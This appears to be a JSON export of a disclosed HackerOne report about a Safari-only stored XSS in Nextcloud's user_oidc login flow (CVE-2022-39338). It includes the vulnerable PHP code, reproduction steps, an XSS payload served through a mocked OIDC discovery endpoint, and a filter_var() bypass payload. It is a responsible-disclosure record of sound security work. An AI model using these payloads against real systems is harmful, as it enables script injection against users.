@@ -1,0 +1,510 @@
+{
+  "id": 1687410,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjg3NDEw",
+  "url": "https://hackerone.com/reports/1687410",
+  "title": "[user_oidc] Stored XSS via Authorization Endpoint - Safari-Only",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-31T13:13:12.504Z",
+  "submitted_at": "2022-08-31T13:13:12.592Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lauritz",
+    "url": "/lauritz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-39338"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-12-18T12:41:59.578Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-12-18T12:41:59.494Z",
+  "team_member_agreed_on_going_public_at": "2022-11-25T11:28:43.412Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThe [OpenID Connect User Backend](https://github.com/nextcloud/user_oidc/) allows users to login to Nextcloud using SSO.\n\nA workaround that was apparently implemented for the *Safari*  browser enables stored Cross-Site-Scripting (XSS). The vulnerability only affects user agents that include \"**Safari**\" within their user agent string and is further limited by a restrictive Content-Security-Policy that is applied on the affected endpoint.\n\n## Vulnerable Code\n`/var/www/html/custom_apps/user_oidc/lib/Controller/LoginController.php`\n```php\n\t\t// Workaround to avoid empty session on special conditions in Safari\n\t\t// https://github.com/nextcloud/user_oidc/pull/358\n\t\tif ($this->request->isUserAgent(['/Safari/']) && !$this->request->isUserAgent(['/Chrome/'])) {\n\t\t\treturn new Http\\DataDisplayResponse('<meta http-equiv=\"refresh\" content=\"0; url=' . $url . '\" />');\n\t\t}\n```\n\n\n## Exploit/Steps To Reproduce\n0. Setup Nextcloud using the docker image:\n```console\n$ docker run -p 8081:80 nextcloud:latest\n```\n1. Enable `user_oidc` module via http://localhost:8081/settings/apps/integration/user_oidc\n2. Configure plugin via http://localhost:8081/settings/admin/user_oidc - add a provider with arbitrary identifier, client_id and client_secret. Include the following URL as discovery endpoint: https://lhq.at/poc_jkhfdasgfdaskjlfadskhfdas.php.     \n{F1894251}\n\nThe mocked discovery endpoint responds as follows:\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n[...]\n\n{\n  \"issuer\":\"http:\\/\\/idp.local:3000\",\n  \"authorization_endpoint\":\"'\\\" http-equiv=><svg\\/onload=alert(document.domain)>\",\n[...]\n} \n```\n3.  Launch a login flow using a Safari browser: http://localhost:8081/login.    \nNextcloud responds as follows without sufficiently encoding or filtering the `authorization_endpoint`:\n```http\nHTTP/1.1 200 OK\nDate: Wed, 31 Aug 2022 12:47:57 GMT\nServer: Apache/2.4.54 (Debian)\nReferrer-Policy: no-referrer\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Permitted-Cross-Domain-Policies: none\nX-Robots-Tag: none\nX-XSS-Protection: 1; mode=block\nX-Powered-By: PHP/8.0.21\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'\nX-Request-Id: yUWr3aQshJ5OHyMuzG1j\nFeature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'\nContent-Disposition: inline; filename=\"\"\nVary: Accept-Encoding\nContent-Length: 492\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n<meta http-equiv=\"refresh\" content=\"0; url='\" http-equiv=><svg/onload=alert(document.domain)>?client_id=test.local&response_type=code&scope=openid+email+profile&redirect_uri=http%3A%2F%2Flocalhost%3A8081%2Fapps%2Fuser_oidc%2Fcode&claims=%7B%22id_token%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%2C%22userinfo%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%7D&state=FB8IZL2JE55LJ1Y5HJAINPY6OTDQ16P1&nonce=356M5O3J1PKMRKJNBKE40RUGJA06O40E\" />\n```\n\nThe execution of JavaScript is prevented by the `Content-Security-Policy` header:      \n{F1894250}\n\n## Impact\n\nStored XSS. The impact is limited due to the restrictive CSP that is applied on this endpoint.",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1894250,
+      "file_name": "xss2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5ulz2it24bxffp2vcnd00ve9e0r3?response-content-disposition=attachment%3B%20filename%3D%22xss2.png%22%3B%20filename%2A%3DUTF-8%27%27xss2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065817Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=97c4786fd2603ba63a9413196a2eb80e288e4286b8516fcaab22541c3b1f5297",
+      "file_size": 48773,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1894251,
+      "file_name": "xss1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a6nh8d762i1ihfoms98u2snzd9zf?response-content-disposition=attachment%3B%20filename%3D%22xss1.png%22%3B%20filename%2A%3DUTF-8%27%27xss1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065817Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5d5cb972c8894aeacfc9a647d83ed053f75929b8d4aeb5e68c1ee6acb381d113",
+      "file_size": 879150,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-12-25T11:28:43.554Z",
+  "allow_singular_disclosure_after": -23484574.316773903,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "jumpydata",
+    "zy9ard3",
+    "shubham_srt",
+    "h4x0r_dz",
+    "sa1tama0",
+    "exception",
+    "sameersec",
+    "shivammusic",
+    "kaiz3nn",
+    "pappaboui",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68215,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/user_oidc",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 18202426,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. For obvious reasons we'd like to ask you to not disclose this issue to any other party.",
+      "automated_response": true,
+      "created_at": "2022-08-31T13:13:12.986Z",
+      "updated_at": "2022-08-31T13:13:12.986Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18205429,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. For obvious reasons we'd like to ask you to not disclose this issue to any other party.",
+      "automated_response": false,
+      "created_at": "2022-08-31T15:17:06.195Z",
+      "updated_at": "2022-08-31T15:17:06.195Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18707382,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi there! \nI would like to request an update for this report.\nPlease let me know in case there is anything you need from my side.\n\nBest regards and have a great day,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2022-10-10T08:35:06.109Z",
+      "updated_at": "2022-10-10T08:35:06.109Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18709006,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "As far as I read the engineering communication this was fixed already and we are currently waiting for a new version",
+      "automated_response": false,
+      "created_at": "2022-10-10T10:42:19.386Z",
+      "updated_at": "2022-10-10T10:42:19.386Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18709007,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks a lot for your report again. This has been resolved in our next maintenance releases and we're working on the advisories at the moment.\n\nIf you have a GitHub account please let us know the username, and we will associate it with the advisory.\n",
+      "automated_response": false,
+      "created_at": "2022-10-10T10:42:37.171Z",
+      "updated_at": "2022-10-10T10:42:37.171Z",
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lauritz",
+        "url": "/lauritz"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18709205,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nickvergessen,\n\nthank you very much for the update!\nThis is my GitHub account: https://github.com/lauritzh\n\nBest regards,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2022-10-10T11:13:55.684Z",
+      "updated_at": "2022-10-10T11:13:55.684Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18815764,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi there!\nI just commented in https://github.com/nextcloud/security-advisories/security/advisories/GHSA-5fpw-795h-rg57 but wanted to keep track on H1, too.\n\nThe SA looks good so far, but I am unsure whether the applied fix is complete.\nI need to recreate my test environment before I can test thoroughly. But the fix seems to rely on the `filter_var()` method:\n```php\n[...]\nfilter_var($discovery['authorization_endpoint'], FILTER_VALIDATE_URL) === false)\n[...]\n```\n\nIt seems like it could be possible to bypass this, as (at least using the command line) the `filter_var()` method happily accepts dangerous characters such as `'`, `\"`, `<` and `>`:\n```console\n$  php -a\nInteractive shell\n\nphp > var_dump(filter_var('https://test.test/\\'\"http-equiv=><svg/onload=alert(1)>', FILTER_VALIDATE_URL));\nstring(53) \"https://test.test/'\"http-equiv=><svg/onload=alert(1)>\"\n```\n\nBest regards,\nLauritz \n",
+      "automated_response": false,
+      "created_at": "2022-10-17T11:06:18.380Z",
+      "updated_at": "2022-10-17T11:06:18.380Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18930806,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-24T15:52:03.374Z",
+      "updated_at": "2022-10-24T15:52:03.374Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "Low (3.1)",
+        "old_severity_id": 1643973,
+        "new_severity_id": 1715690
+      },
+      "actor": {
+        "username": "julien_veyssier",
+        "cleared": false,
+        "verified": false,
+        "url": "/julien_veyssier",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18942238,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-25T10:40:25.331Z",
+      "updated_at": "2022-10-25T10:40:25.331Z",
+      "cve_ids": [
+        "CVE-2022-39338"
+      ],
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 18942243,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-25T10:40:44.140Z",
+      "updated_at": "2022-10-25T10:40:44.140Z",
+      "additional_data": {
+        "old_severity": "Low (3.1)",
+        "new_severity": "Low (3.5)",
+        "old_severity_id": 1715690,
+        "new_severity_id": 1716622
+      },
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 19166407,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-10T09:33:33.220Z",
+      "updated_at": "2022-11-10T09:33:33.220Z",
+      "actor": {
+        "url": "/nextcloud",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Nextcloud"
+        }
+      },
+      "bounty_amount": "100.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "nextcloud",
+      "collaborator": {
+        "username": "lauritz",
+        "url": "/lauritz"
+      }
+    },
+    {
+      "id": 19342538,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-25T11:28:43.461Z",
+      "updated_at": "2022-11-25T11:28:43.461Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "nickvergessen",
+        "cleared": false,
+        "verified": false,
+        "url": "/nickvergessen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 19616835,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-12-18T12:41:59.527Z",
+      "updated_at": "2022-12-18T12:41:59.527Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    },
+    {
+      "id": 19616836,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-12-18T12:41:59.647Z",
+      "updated_at": "2022-12-18T12:41:59.647Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nextcloud"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
